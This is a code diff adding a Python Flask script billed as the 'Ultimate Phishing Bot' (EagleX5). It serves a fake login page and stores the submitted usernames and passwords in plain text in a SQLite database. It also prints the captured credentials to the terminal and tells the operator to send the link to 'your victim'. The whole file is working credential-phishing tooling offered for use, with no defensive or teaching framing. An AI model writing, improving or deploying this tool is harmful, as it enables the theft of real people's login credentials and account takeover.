@@ -1,0 +1,124 @@
+import os
+import time
+import socket
+from flask import Flask, render_template, request
+import sqlite3
+import pyfiglet
+import logging
+import sys
+
+app = Flask(__name__)
+
+# Disable Flask logs to hide unwanted info like "Serving Flask app" and "Running on"
+app.logger.disabled = True
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+
+# Global variables to store username and password
+username = ""
+password = ""
+
+# Function to display a cool header with an enhanced banner
+def display_header():
+    os.system('clear')  # Clear the terminal screen
+
+    # Enhanced ASCII art with a border
+    ascii_art = pyfiglet.figlet_format("EagleX5", font="slant")
+    banner_width = len(max(ascii_art.splitlines(), key=len)) + 6  # Adjust width for alignment
+
+    # Add a border above the phishing information
+    print("\033[1;32m" + "=" * banner_width + "\033[0m")
+    print("\033[1;32m" + " Welcome to the Ultimate Phishing Bot! ".center(banner_width, "=") + "\033[0m")
+    print("\033[1;32m" + "=" * banner_width + "\033[0m")
+    time.sleep(1)
+
+    # Add dynamic ASCII Art banner
+    for line in ascii_art.splitlines():
+        print(f"\033[1;36m{line}\033[0m")
+        time.sleep(0.1)  # Typing effect delay
+
+# Function to find an available port
+def get_available_port():
+    for port in range(6000, 65535):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            result = s.connect_ex(('127.0.0.1', port))
+            if result != 0:
+                return port
+    raise RuntimeError("No available ports found.")
+
+# Flask route for phishing page (template must be available in the templates folder)
+@app.route('/')
+def phishing_page():
+    try:
+        return render_template('index.html', success=False)  # Initially, no success message
+    except Exception as e:
+        return "An error occurred while loading the page."
+
+# Flask route to handle form submission
+@app.route('/submit', methods=['POST'])
+def handle_submission():
+    global username, password  # Declare them as global variables
+    try:
+        username = request.form.get('username')
+        password = request.form.get('password')
+
+        # Save credentials to a database in plain text (no hashing)
+        conn = sqlite3.connect('credentials.db')
+        cursor = conn.cursor()
+        cursor.execute('''CREATE TABLE IF NOT EXISTS credentials (username TEXT, password TEXT)''')
+        cursor.execute('INSERT INTO credentials (username, password) VALUES (?, ?)', (username, password))
+        conn.commit()
+        conn.close()
+
+        # After saving credentials, print them directly in the terminal
+        print(f"\033[1;33m+--------------------------------------------------+\033[0m")
+        print(f"\033[1;33m| Username: \033[1;34m{username}\033[0m\033[1;33m        |\033[0m")
+        print(f"\033[1;33m| Password: \033[1;34m{password}\033[0m\033[1;33m        |\033[0m")
+        print(f"\033[1;33m+--------------------------------------------------+\033[0m")
+        
+        # After displaying, send a success message to the user
+        return render_template('index.html', success=True, username=username, password=password)
+
+    except Exception as e:
+        return "An error occurred, please try again later."
+
+# Main function to start the bot
+def start_bot():
+    display_header()
+
+    # Find and display an available port
+    port = get_available_port()
+
+    # Clear the screen after the setup and display phishing information
+    os.system('clear')  # Clear terminal screen after update
+
+    # Add another header or banner to separate phishing links
+    print("\033[1;32m" + "=" * 50 + "\033[0m")
+    print("\033[1;32m" + " Phishing Links Ready! ".center(50, "=") + "\033[0m")
+    print("\033[1;32m" + "=" * 50 + "\033[0m")
+
+    # Display phishing links centered
+    print("\n" * 3)
+    print(f"\033[1;32mSend this link to your victim 1:\033[0m")
+    print(f"\033[1;31m{f'http://127.0.0.1:{port}'.center(50)}\033[0m")  # Link in red color and centered
+    print("\n" * 2)  # Gap between the links
+
+    print(f"\033[1;32mSend this link to your victim 2:\033[0m")
+    print(f"\033[1;31m{f'http://127.0.0.1:{port}'.center(50)}\033[0m")  # Link in red color and centered
+
+    time.sleep(1)
+
+    # Display the username and password from the terminal as shown
+    print("\n" * 2)  # Add space before credentials
+    print("\033[1;36mWait for victims' information...\033[0m")
+    time.sleep(1)
+
+    # Run the Flask app without showing server info
+    try:
+        app.run(host='0.0.0.0', port=port, debug=False)  # Run in production mode
+    except KeyboardInterrupt:
+        sys.exit("Server stopped. Exiting...")
+
+# Run the bot
+if __name__ == "__main__":
+    start_bot()
